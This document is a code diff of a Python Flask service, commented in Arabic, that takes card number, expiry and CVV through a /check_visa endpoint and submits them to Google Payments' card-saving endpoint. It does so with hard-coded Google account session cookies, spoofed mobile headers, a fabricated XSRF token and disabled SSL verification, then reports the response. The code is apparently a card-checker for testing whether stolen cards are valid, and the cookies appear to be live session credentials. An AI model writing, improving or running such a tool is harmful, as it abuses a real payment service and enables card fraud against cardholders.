@@ -1,11 +1,17 @@
 from flask import Flask, request, jsonify
 import requests
 import urllib3
+import json
+from datetime import datetime
 
-# تعطيل تحذارات SSL غير الضرورية
+# تعطيل تحذارات SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
+
+def generate_xsrf_token():
+    """إنشاء رمز XSRF فريد بناءً على الطابع الزمني الحالي"""
+    return f"XSRF-{int(datetime.now().timestamp()*1000)}"
 
 @app.route('/check_visa', methods=['GET'])
 def check_visa():
@@ -13,15 +19,38 @@ def check_visa():
     visa_data = request.args.get('visa')
     
     if not visa_data:
-        return jsonify({'error': 'يجب تقديم بيانات الفيزا في الصيغة: رقم_الفيزا|الشهر|السنة|cvv'}), 400
+        return jsonify({
+            'status': 'error',
+            'message': 'يجب تقديم بيانات الفيزا في الصيغة: رقم_الفيزا|الشهر|السنة|cvv'
+        }), 400
     
     try:
         # تقسيم بيانات الفيزا إلى مكوناتها
         card_number, month, year, cvv = visa_data.split('|')
-    except ValueError:
-        return jsonify({'error': 'صيغة البيانات غير صحيحة. يجب أن تكون: رقم_الفيزا|الشهر|السنة|cvv'}), 400
-    
-    # تعريف الكوكيز المحدثة
+        
+        # التحقق من صحة البيانات
+        if not all([card_number.isdigit(), month.isdigit(), year.isdigit(), cvv.isdigit()]):
+            raise ValueError("يجب أن تحتوي جميع الحقول على أرقام فقط")
+            
+        if len(card_number) not in [15, 16]:
+            raise ValueError("رقم البطاقة غير صحيح")
+            
+        if len(month) != 2 or int(month) > 12:
+            raise ValueError("شهر انتهاء الصلاحية غير صحيح")
+            
+        if len(year) != 2 and len(year) != 4:
+            raise ValueError("سنة انتهاء الصلاحية غير صحيحة")
+            
+        if len(cvv) not in [3, 4]:
+            raise ValueError("رمز CVV غير صحيح")
+            
+    except ValueError as e:
+        return jsonify({
+            'status': 'error',
+            'message': str(e) or 'صيغة البيانات غير صحيحة. يجب أن تكون: رقم_الفيزا|الشهر|السنة|cvv'
+        }), 400
+
+    # إعداد الكوكيز المحدثة
     cookies = {
         'OTZ': '8178671_44_48_171240_44_319500',
         'AEC': 'AVh_V2hTIC9-mVszEOINI8u2nOJmGZ3LCjUDyCXNRSfyBh4uoAJZdNSpGJY',
@@ -36,44 +65,30 @@ def check_visa():
         'SAPISID': 'Bf_-v6LERe4OwjIh/AGR1n7o8YXV0arAwF',
         '__Secure-1PAPISID': 'Bf_-v6LERe4OwjIh/AGR1n7o8YXV0arAwF',
         '__Secure-3PAPISID': 'Bf_-v6LERe4OwjIh/AGR1n7o8YXV0arAwF',
-        '__utma': '207539602.2100594883.1742201890.1753803374.1753806231.14',
-        '__utmc': '207539602',
-        '__utmz': '207539602.1753806231.14.14.utmcsr=wallet.google.com|utmccn=(referral)|utmcmd=referral|utmcct=/',
-        '__utmt': '1',
-        'S': 'billing-ui-v3=F1levuIu8n_WbEhTPcmgyBKSxUsg8qld:billing-ui-v3-efe=F1levuIu8n_WbEhTPcmgyBKSxUsg8qld',
-        '__utmb': '207539602.6.9.1753806264903',
         'SIDCC': 'AKEyXzW7z_kNKZIcFomX5GHctZ7_kBYXSv42OXvV9SM9u4G5oB6dEtesHZopqFd6dzGRAo2bRg',
         '__Secure-1PSIDCC': 'AKEyXzXdGXFVkt1xTyzStzgREnMKWbE49TT5yyBxTfDwXZVDfuw2Ppopaj0JxsKMPCOACPl6Tpw',
         '__Secure-3PSIDCC': 'AKEyXzWmZYsmaTx1FQKX4BKyJFfZ40xJyTBWyy1BD87u2n5KLD4BXUDNWWRM5b_wC7wvUXFPI4Q',
     }
 
-    # تعريف الهيدرات المحدثة
+    # إعداد الهيدرات المحدثة
     headers = {
         'authority': 'payments.google.com',
         'accept': '*/*',
         'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6,he;q=0.5',
         'content-type': 'application/x-www-form-urlencoded',
         'origin': 'https://payments.google.com',
-        'referer': 'https://payments.google.com/payments/u/0/embedded/instrument_manager?tc=96%2C87&wst=1753806222984&cst=1753806227782&si=6534376669104887&pet&sri=2&hmi=false&ipi=3yzlibfzljbl&hostOrigin=aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..&eo=https%3A%2F%2Fwallet.google.com&origin=https%3A%2F%2Fwallet.google.com&ancori=https%3A%2F%2Fwallet.google.com&mm=e&hl=ar&style=%3Am2&ait=GAIA&cn=%24p_424w9ti8peed0&fms=true&actionToken=CiQIASICVVNoAXAAeAGaAQ8KByDD7%2FOOvw8g9acEYgDAAgD4AwE%3D&spul=502&cori=https%3A%2F%2Fwallet.google.com',
+        'referer': 'https://payments.google.com/payments/u/0/embedded/instrument_manager',
         'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-        'sec-ch-ua-arch': '""',
-        'sec-ch-ua-bitness': '""',
-        'sec-ch-ua-full-version': '"137.0.7337.0"',
-        'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
         'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-model': '"SM-A307FN"',
         'sec-ch-ua-platform': '"Android"',
-        'sec-ch-ua-platform-version': '"11.0.0"',
-        'sec-ch-ua-wow64': '?0',
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'x-client-data': 'CIOJywE=',
         'x-requested-with': 'XmlHttpRequest',
     }
 
-    # تعريف البارامترات المحدثة
+    # إعداد البارامترات المحدثة
     params = {
         'ait': 'GAIA',
         'cn': '$p_424w9ti8peed0',
@@ -85,49 +100,124 @@ def check_visa():
         'origin': 'https://wallet.google.com',
         'si': '6534376669104887',
         'style': ':m2',
-        'cst': '1753806227782',
-        'wst': '1753806222984',
+        'cst': str(int(datetime.now().timestamp()*1000)),
+        'wst': str(int(datetime.now().timestamp()*1000 - 500)),
         's7e': '3.1.0.0;3.1.0.1',
         'rt': 'j',
         's': '5',
     }
 
-    # تعريف بيانات الطلب المحدثة
+    # إعداد بيانات الطلب المحدثة
     data = {
-        'xsrf': 'AJWlU2MTRmXmM7bwi6aKFx-tMCAVhtSGoQ:1753806229765',
+        'xsrf': generate_xsrf_token(),
         '3.1.0.0': card_number,
         '3.1.0.1': cvv,
-        'msg': '[[null,"ACo329yKv8zlA//gTwZoZ8SYH8lB1NY29WZoo4K5m2AOETrI99a7TRguLWggb067eoN2UTEqu1Ezz9R7dV3rO6PoPeOKGQPFr5L6FwjRop+0Cslt6M3cyZb8akvjvQPSyKKycZ/1j6oqiXdlUUSp7kMLDRu7yLgCTr3vf8AnXGvIqMAnfaVo+Fu/qnnLkQlgnW/SCdK/T7IrgoeHTgjQu5h9ZCPaBTaQSQEj5jF9QgVo+ZGpvZ/XtiEMl5pxO9A59GnaYPKorck8",null,[null,[null,null,null,["!4-Cl4LjNAAZAdzQfYHdCaPy-MJKk6bc7ADQBEArZ1P4IokwYBuN4-t6kcZFGgu0KjDT3bPOkwGSuRj293wthUWE3U3M8kk9BF5shkQ7ZAgAABuZSAAAARGgBB34ATNBIljJw3i7BEfnMrH35ZVeKt5bKW0vznOAxyK505v2q9fPaKlwDfS635-6OUADgaQQaEaubSfZiqPQg4Ne0t0U2FyOvtioglbE3zdmZB7MIuCHsyjdajvbvh647Q-dOUCNJyoQnJOdpOj7TMV3RlbqgTnKA00kmFMiOq6x-lPb8fyc1WSX-PWLNMYkXncBGG6a7zK7Vah53w8Qp0YEJ7KSrMHUp0egZ7zaTkHtoufM9A9wNmUPw97_VCpSVIuNpzhpOkPj1ycOntX15lprLSMrZ601QJj7-vO96nZ3npU-iILt2SAQmazraY_bgQveXi-net7IkFq5rdE-lxBpp7SyA1X2EH-pUtHO_tVBYjb32WXPIPik_1S0lDANCnI5HOc1V8ib4yMWACj3_7426Wp9g_qXRXfcLphqZNZxrur0pZ5HR4k0BYw0jDB2BuhyfU-LeRq3x_wOcuKtUB0KuY02-MDgpRXvPU_b72RpJAZav3pOZrg2PAbNPuXAo9P4Tt1mmUoK7YxsUJSte7n12v3Tq7QEqWc2BDJrXd4OCOFEyLS6WNqVn3XIJkERTo_eMI-gpG-p-bCF1ttKIUaLdoAOmqJC0E4spAVk_1xov52h_upOdxJ-2qNS8N5gO5PKH_ngXrL0Fo-yOmgu5azkGs17ZFx38k-644NLTz8b1o5cDwu50kMf8sEKG7fJdbIdkxw_yXpS8HFOoelX_Nr0YeYCymMNY4KsLHmhMqYBmnnnDEb_ZEt28-RihrH0sCwAb0NV9Tkr4EztAC8pAB6EE8uP2PqBue4fOJzahMXI_w62XzQ44dzFiLpZryUlrgbbYWMS_vKj_HIDDr2AeAkErLhES_LIpTz21gDOuwve5ppgDHnyavGwKz038Gq2dAdMoBBmTfLZjbiQtCMtCkvUKK-NoZ4yvggtowo29Qv47ZPqxrLxKGR3EY6uUiP7Og4XvZdkLgJXfEK6Kma09ieID2nhX7S3Z6KkcmlifI3QZhdm4EqAWk37x2CmeRZ6OK-JNYXGac4-xp-PwwJiqZse3m9hKLRvjTavvQfg2Oad2e0eOhXhoizlfxdDRL25RH2KwCw0s-CZ7y9WMl79caqhT6j0H17lrxxnp0QPFBP5Eknae7z2zUxC6bzTkUP1HC-qteA1J3ncq_hj2gZPMiB1M0WRw6V--O5sVVCXWmatj5UQALJmmn8-wjdWeuR2TXkwBv85JE21YHQNVDzPoPPQX2q8BUAnw2hwm21K3EEoL6bNx6Uuza36-V5YMxJzI2rvZiqk6HoZYVf1Rfn73JEJ-VJVFUx4_vWnXjUr7ZFx9GGSUvWQcQxKgTGZV_lin3ZtF_R10U7jqrKFf2Fl32klrVA6TVXQZ1DJsdshc5BBrh0_sJppQBdRSmyAswTkQu92iJy8qPXXF493yf-is7A4AUaXHjPojyRrk4pvj9cS10g62MXxGDKXXlQfn4qK8t3ZZz11oOwVJk5_F9ZgmyzSn0XNyAZCB4sHu8qtFYDhABZLI4Ff8uI2WG19ZsVGBcFEbfS1N6Kiy0OCqtHhyF8ONwJ1WFUDbdD6zwd2pQDTO2Ae5TBFKzTOOA0DDcj2Pd0Q2H5-pLxgC3Y81Qf7nXXNVWuXxtNcJHdMqSKhTKaPZTWdQ4TmljlsbBH49Zz8uzGQnO4mWy008hJg164lOguQY9_rfZRzqOiXzRr4nbQOSS6h79ttjzNNM5UMxqCswrsfahW4JRTLrPQzq4dZI9hAoCK83d_OPD0DSfG2A5L-oSAfc0yjW6_ufi-RkvaWlgnVYIqmw1hUC7p8Yz0wkijBWQAXekBzW0dHBOmgZb8JNXHFJn1UTgmr19I9JZvaq0vp_AhxVoLX7bUlJ_NUngb59c4ngSc8x_QUHgpuLnZ5FfTFKW_FcwbQug2-4q_gk9odyeCIpulD96cfh1RW-_GAzY4FPXv30k8zLqjJilOPe6TQVXqbTzU2RZ1RBqtfaFp6h9Xr0W4VzMOEvfM0X34ai0C8MtBIfVklRJYVPMY5bNmGk-WHzZOXp3hoi7MKOKf-P5PtzIn7rVe2PD_nIKO_KmDaeNQRHMkNH0yjvK4cuyMUT9UmuV6ruVWPmrTwHbsmODT_cpcPnJo3I79M5jB4trABMVpfi_FubED-2Rv4dqCmWdyY-oWodIEupS4m5mOmH1cKFkcIsJUNVDN6tztw_ohD6RLafBeQC0K5-9cnX4hRi0-NTo2gzrp3cnkWCG9fGA1dBVvxDRPJarhZcb43uB7nI7WZNl4x1vyp8-kv2ZQndRkUMUIHveJ6rdJuFoQVA_BFAVEUxuw7p3lgIZKW8yFm8Leh_vBaJ6-wd3j88YM6Mku6_McDlQGgOfTMXlvJvzFU0QePahhCZJaAB2UNv5qiuqYXo-AURWjVhD5Vu3nP1ICDLwRsJSz4aLtzMru5B29wjVqQTA_M1RRTs1hr3ZNRTdavtqbs2mHV9Vw5ZhplaSMtF-iFRC3L9GtRNEZaX6mY6ItN5mVCjM-CoLnlRgE2eTF_vBZ97YqzyzD51irLlDmJ6YOJV8R-NPzI8l-qv225yUjAKxYAW73nOyTa8dbquLyKrTWqEqAJgRE6ECZOUBk5nQE2Bq8-Z5-R_WT_A7CIKZMXiEL-7a0wrPlSc-aVZD4Cvbrgqf9mkPxEwhraFrxCk94FiKPFFOcWsq-RVmnWOGRIC9kmhOJmQAIyxKcgOMjuJvCXmHjnHNtJERLRT30Y"]],null,null,"ar",1,1],null,null,[null,[["__secure_field__4fa1d0a7","__secure_field__4fa1d0a7",11,2029,null,"1703",null,"__s7e_data__61bb463a","هونجا البونجا",[["US",null,"NY",null,"New York",null,null,null,null,null,null,"10001",null,["Candice Hill Angela Robinson","836393"]],null,null,null,"billingAddress",null,null,2001],"CAIQAhogEgJVUxoDVVNEMAZAAFABYPWnBGoCCgCgARSoARSwARQ=","0.buyertos/US/6/20/en,0.privacynotice/ZZ/5/9/ar","creditCardForm-1"]]]]',
+        'msg': json.dumps([
+            [
+                None,
+                "ACo329yKv8zlA//gTwZoZ8SYH8lB1NY29WZoo4K5m2AOETrI99a7TRguLWggb067eoN2UTEqu1Ezz9R7dV3rO6PoPeOKGQPFr5L6FwjRop+0Cslt6M3cyZb8akvjvQPSyKKycZ/1j6oqiXdlUUSp7kMLDRu7yLgCTr3vf8AnXGvIqMAnfaVo+Fu/qnnLkQlgnW/SCdK/T7IrgoeHTgjQu5h9ZCPaBTaQSQEj5jF9QgVo+ZGpvZ/XtiEMl5pxO9A59GnaYPKorck8",
+                None,
+                [
+                    None,
+                    [
+                        None,
+                        None,
+                        None,
+                        ["!4-Cl4LjNAAZAdzQfYHdCaPy-MJKk6bc7ADQBEArZ1P4IokwYBuN4-t6kcZFGgu0KjDT3bPOkwGSuRj293wthUWE3U3M8kk9BF5shkQ7ZAgAABuZSAAAARGgBB34ATNBIljJw3i7BEfnMrH35ZVeKt5bKW0vznOAxyK505v2q9fPaKlwDfS635-6OUADgaQQaEaubSfZiqPQg4Ne0t0U2FyOvtioglbE3zdmZB7MIuCHsyjdajvbvh647Q-dOUCNJyoQnJOdpOj7TMV3RlbqgTnKA00kmFMiOq6x-lPb8fyc1WSX-PWLNMYkXncBGG6a7zK7Vah53w8Qp0YEJ7KSrMHUp0egZ7zaTkHtoufM9A9wNmUPw97_VCpSVIuNpzhpOkPj1ycOntX15lprLSMrZ601QJj7-vO96nZ3npU-iILt2SAQmazraY_bgQveXi-net7IkFq5rdE-lxBpp7SyA1X2EH-pUtHO_tVBYjb32WXPIPik_1S0lDANCnI5HOc1V8ib4yMWACj3_7426Wp9g_qXRXfcLphqZNZxrur0pZ5HR4k0BYw0jDB2BuhyfU-LeRq3x_wOcuKtUB0KuY02-MDgpRXvPU_b72RpJAZav3pOZrg2PAbNPuXAo9P4Tt1mmUoK7YxsUJSte7n12v3Tq7QEqWc2BDJrXd4OCOFEyLS6WNqVn3XIJkERTo_eMI-gpG-p-bCF1ttKIUaLdoAOmqJC0E4spAVk_1xov52h_upOdxJ-2qNS8N5gO5PKH_ngXrL0Fo-yOmgu5azkGs17ZFx38k-644NLTz8b1o5cDwu50kMf8sEKG7fJdbIdkxw_yXpS8HFOoelX_Nr0YeYCymMNY4KsLHmhMqYBmnnnDEb_ZEt28-RihrH0sCwAb0NV9Tkr4EztAC8pAB6EE8uP2PqBue4fOJzahMXI_w62XzQ44dzFiLpZryUlrgbbYWMS_vKj_HIDDr2AeAkErLhES_LIpTz21gDOuwve5ppgDHnyavGwKz038Gq2dAdMoBBmTfLZjbiQtCMtCkvUKK-NoZ4yvggtowo29Qv47ZPqxrLxKGR3EY6uUiP7Og4XvZdkLgJXfEK6Kma09ieID2nhX7S3Z6KkcmlifI3QZhdm4EqAWk37x2CmeRZ6OK-JNYXGac4-xp-PwwJiqZse3m9hKLRvjTavvQfg2Oad2e0eOhXhoizlfxdDRL25RH2KwCw0s-CZ7y9WMl79caqhT6j0H17lrxxnp0QPFBP5Eknae7z2zUxC6bzTkUP1HC-qteA1J3ncq_hj2gZPMiB1M0WRw6V--O5sVVCXWmatj5UQALJmmn8-wjdWeuR2TXkwBv85JE21YHQNVDzPoPPQX2q8BUAnw2hwm21K3EEoL6bNx6Uuza36-V5YMxJzI2rvZiqk6HoZYVf1Rfn73JEJ-VJVFUx4_vWnXjUr7ZFx9GGSUvWQcQxKgTGZV_lin3ZtF_R10U7jqrKFf2Fl32klrVA6TVXQZ1DJsdshc5BBrh0_sJppQBdRSmyAswTkQu92iJy8qPXXF493yf-is7A4AUaXHjPojyRrk4pvj9cS10g62MXxGDKXXlQfn4qK8t3ZZz11oOwVJk5_F9ZgmyzSn0XNyAZCB4sHu8qtFYDhABZLI4Ff8uI2WG19ZsVGBcFEbfS1N6Kiy0OCqtHhyF8ONwJ1WFUDbdD6zwd2pQDTO2Ae5TBFKzTOOA0DDcj2Pd0Q2H5-pLxgC3Y81Qf7nXXNVWuXxtNcJHdMqSKhTKaPZTWdQ4TmljlsbBH49Zz8uzGQnO4mWy008hJg164lOguQY9_rfZRzqOiXzRr4nbQOSS6h79ttjzNNM5UMxqCswrsfahW4JRTLrPQzq4dZI9hAoCK83d_OPD0DSfG2A5L-oSAfc0yjW6_ufi-RkvaWlgnVYIqmw1hUC7p8Yz0wkijBWQAXekBzW0dHBOmgZb8JNXHFJn1UTgmr19I9JZvaq0vp_AhxVoLX7bUlJ_NUngb59c4ngSc8x_QUHgpuLnZ5FfTFKW_FcwbQug2-4q_gk9odyeCIpulD96cfh1RW-_GAzY4FPXv30k8zLqjJilOPe6TQVXqbTzU2RZ1RBqtfaFp6h9Xr0W4VzMOEvfM0X34ai0C8MtBIfVklRJYVPMY5bNmGk-WHzZOXp3hoi7MKOKf-P5PtzIn7rVe2PD_nIKO_KmDaeNQRHMkNH0yjvK4cuyMUT9UmuV6ruVWPmrTwHbsmODT_cpcPnJo3I79M5jB4trABMVpfi_FubED-2Rv4dqCmWdyY-oWodIEupS4m5mOmH1cKFkcIsJUNVDN6tztw_ohD6RLafBeQC0K5-9cnX4hRi0-NTo2gzrp3cnkWCG9fGA1dBVvxDRPJarhZcb43uB7nI7WZNl4x1vyp8-kv2ZQndRkUMUIHveJ6rdJuFoQVA_BFAVEUxuw7p3lgIZKW8yFm8Leh_vBaJ6-wd3j88YM6Mku6_McDlQGgOfTMXlvJvzFU0QePahhCZJaAB2UNv5qiuqYXo-AURWjVhD5Vu3nP1ICDLwRsJSz4aLtzMru5B29wjVqQTA_M1RRTs1hr3ZNRTdavtqbs2mHV9Vw5ZhplaSMtF-iFRC3L9GtRNEZaX6mY6ItN5mVCjM-CoLnlRgE2eTF_vBZ97YqzyzD51irLlDmJ6YOJV8R-NPzI8l-qv225yUjAKxYAW73nOyTa8dbquLyKrTWqEqAJgRE6ECZOUBk5nQE2Bq8-Z5-R_WT_A7CIKZMXiEL-7a0wrPlSc-aVZD4Cvbrgqf9mkPxEwhraFrxCk94FiKPFFOcWsq-RVmnWOGRIC9kmhOJmQAIyxKcgOMjuJvCXmHjnHNtJERLRT30Y"],
+                        None,
+                        None,
+                        "ar",
+                        1,
+                        1
+                    ],
+                    None,
+                    None,
+                    [
+                        None,
+                        [
+                            [
+                                "__secure_field__4fa1d0a7",
+                                "__secure_field__4fa1d0a7",
+                                int(month),
+                                int(year),
+                                None,
+                                cvv,
+                                None,
+                                "__s7e_data__61bb463a",
+                                "هونجا البونجا",
+                                [
+                                    [
+                                        "US",
+                                        None,
+                                        "NY",
+                                        None,
+                                        "New York",
+                                        None,
+                                        None,
+                                        None,
+                                        None,
+                                        None,
+                                        None,
+                                        "10001",
+                                        None,
+                                        ["Candice Hill Angela Robinson", "836393"]
+                                    ],
+                                    None,
+                                    None,
+                                    None,
+                                    "billingAddress",
+                                    None,
+                                    None,
+                                    2001
+                                ],
+                                "CAIQAhogEgJVUxoDVVNEMAZAAFABYPWnBGoCCgCgARSoARSwARQ=",
+                                "0.buyertos/US/6/20/en,0.privacynotice/ZZ/5/9/ar",
+                                "creditCardForm-1"
+                            ]
+                        ]
+                    ]
+                ]
+            ]
+        ]),
         'kt': 'Rs2.0.8:billing_ui_v3::s11,2,26b5e19,1,140,a063ebe9,1,2b6,edd98bac,0,18,4863fd35,0,140,cb2d5c6f,0,2b6,6ad47c6c,2,e8,7bdb49f6,0,95,b6540200,0,140,eea820b6,1,236,1aa4331,0,"Linux armv81,f54683f2,0,"Google Inc.,af794515,0,"5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,d81723d1,1,"ar2dAE,5cc3ab5f,0,"Mozilla2f5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,24a66df6,0,-b4,"Thu Jan 01 1970 023a003a00 GMT2b0200 282a48424a2a 343142 234831482827 27443133454a29,770c67fc,1,7:a21,3,19856ff50ef,10,"cardnumber,"ccmonth,"ccyear,"cvc,"ccname,"COUNTRY,"ORGANIZATION,"RECIPIENT,"ADDRESS_LINE_1,"ADDRESS_LINE_2,"LOCALITY,"POSTAL_CODE,"PHONE_NUMBER,"embedderHostOrigin,"xsrf,"sri,84,2e4:a40,"f,19856ff53d4,"n,0,0,"t,19856ff49c8,0,0,0,0,19856ff49d8,19856ff49d8,19856ff49d8,19856ff49d8,19856ff49d8,0,19856ff49f0,19856ff4e28,19856ff4fb1,19856ff4e4c,19856ff511d,19856ff511e,19856ff5433,19856ff5815,19856ff5818,19856ff5868:a10:a31,3,"h,1,"p,81,3a,"m,57f,16f1,303,1257,1b66,18e9,33e1'
     }
 
     try:
-        # إضافة جلسة مع إعدادات أفضل للاتصال
-        session = requests.Session()
-        session.verify = False  # تعطيل التحقق من SSL (لأغراض الاختبار فقط)
-        session.headers.update(headers)
-        
         # إرسال الطلب مع إعدادات متقدمة
-        response = session.post(
+        response = requests.post(
             'https://payments.google.com/efe/payments/u/0/instrument_manager_save_page',
             params=params,
             cookies=cookies,
+            headers=headers,
             data=data,
             timeout=15,
-            allow_redirects=True
+            verify=False
         )
         
-        # إرجاع الاستجابة كـ JSON
-        return jsonify({
-            'status_code': response.status_code,
-            'headers': dict(response.headers),
-            'content': response.text
-        })
-        
+        # تحليل الاستجابة
+        if response.status_code == 200:
+            try:
+                response_data = response.json()
+                return jsonify({
+                    'status': 'success',
+                    'data': response_data
+                })
+            except ValueError:
+                return jsonify({
+                    'status': 'success',
+                    'raw_response': response.text
+                })
+        else:
+            return jsonify({
+                'status': 'error',
+                'status_code': response.status_code,
+                'response': response.text
+            }), response.status_code
+            
     except requests.exceptions.RequestException as e:
         return jsonify({
-            'error': str(e),
-            'message': 'فشل في الاتصال بخادم جوجل. يرجى التحقق من اتصال الإنترنت أو تحديث الكوكيز والهيدرات.'
+            'status': 'error',
+            'message': f'فشل في الاتصال بخادم جوجل: {str(e)}'
         }), 500
 
 if __name__ == '__main__':
